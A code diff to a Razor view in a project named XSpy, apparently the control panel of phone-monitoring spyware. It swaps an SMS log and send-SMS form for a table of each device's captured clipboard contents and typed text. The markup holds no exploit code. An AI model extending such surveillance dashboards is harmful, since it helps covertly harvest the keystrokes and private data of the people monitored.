@@ -7,56 +7,46 @@
 @model XSpy.Shared.Models.Views.Device.DeviceDataViewModel
 
 @section Styles {
-    <link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/v/bs4/jszip-2.5.0/dt-1.10.23/b-1.6.5/b-html5-1.6.5/b-print-1.6.5/r-2.2.7/datatables.min.css" />
+    <link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/v/bs4/jszip-2.5.0/dt-1.10.23/b-1.6.5/b-html5-1.6.5/b-print-1.6.5/r-2.2.7/datatables.min.css"/>
 }
 
 <section class="content">
     <div class="container-fluid">
-        <partial name="Partial/QuickActions" />
+        <partial name="Partial/QuickActions"/>
 
         <div class="row">
-            <div class="col-6">
+            <div class="col-12">
                 <div class="card">
                     <div class="card-header">
-                        <h3 class="card-title">Mensagens</h3>
+                        <h3 class="card-title">Textos e cópias</h3>
                     </div>
                     <!-- /.card-header -->
                     <div class="card-body">
                         <table id="dataTable" class="table table-hover table-text-center" style="width: 100%">
                             <thead>
-                                <tr>
-                                    <th></th>
-                                    <th>Nome</th>
-                                    <th>Número</th>
-                                    <th>Duração</th>
-                                    <th>Data</th>
-                                </tr>
+                            <tr>
+                                <th>Conteúdo</th>
+                                <th>Tipo</th>
+                                <th>Data</th>
+                            </tr>
                             </thead>
                             <tbody>
 
-                                @foreach (var call in Model.Device.Messages)
-                                {
-                                    <tr>
-
-                                        <td>
-                                            @if (call.Type == CallType.Incoming)
-                                            {
-                                                <i data-toggle="tooltip" title="Mensagem recebida" class="fas fa-external-link-alt" style="transform: scale(-1)"></i>
-                                            }
-                                            else if (call.Type == CallType.Outgoing)
-                                            {
-                                                <i data-toggle="tooltip" title="Mensagem enviada" class="fas fa-external-link-alt"></i>
-                                            }
-                                            else
-                                            {
-                                                <i data-toggle="tooltip" title="Mensagem recusada" class="fas fa-ban"></i>
-                                            }
-                                        
-                                        </td>
-                                        <td>@call.Address</td>
-                                        <td>@call.Date</td>
-                                    </tr>
-                                }
+                            @foreach (var clipboard in Model.Device.Clipboards)
+                            {
+                                <tr>
+                                    <td>@clipboard.Content</td>
+                                    @if (clipboard.IsClipboard)
+                                    {
+                                        <td>Cópia</td>
+                                    }
+                                    else
+                                    {
+                                        <td>Digitação</td>
+                                    }
+                                    <td>@clipboard.CratedAt</td>
+                                </tr>
+                            }
                             </tbody>
                         </table>
                     </div>
@@ -65,30 +55,6 @@
             </div>
 
 
-            <div class="col-6">
-                <div class="card">
-                    <div class="card-header">
-                        <h3 class="card-title">Enviar mensagem</h3>
-                    </div>
-                    <!-- /.card-header -->
-                    <form role="form">
-                        <div class="card-body">
-                            <div class="row">
-                                <div class="col-sm-12">
-                                    <!-- textarea -->
-                                    <div class="form-group">
-                                        <label>Mensagem</label>
-                                        <textarea class="form-control" id="messageText" rows="3" placeholder="Escreva o SMS" maxlenght="255"></textarea>
-                                    </div>
-                                </div>
-                            </div>
-                            <hr />
-                            <button type="button" class="btn btn-primary float-right" id="sendSms">Enviar</button>
-                        </div>
-                    </form>
-                    <!-- /.card-body -->
-                </div>
-            </div>
         </div>
 
     </div>
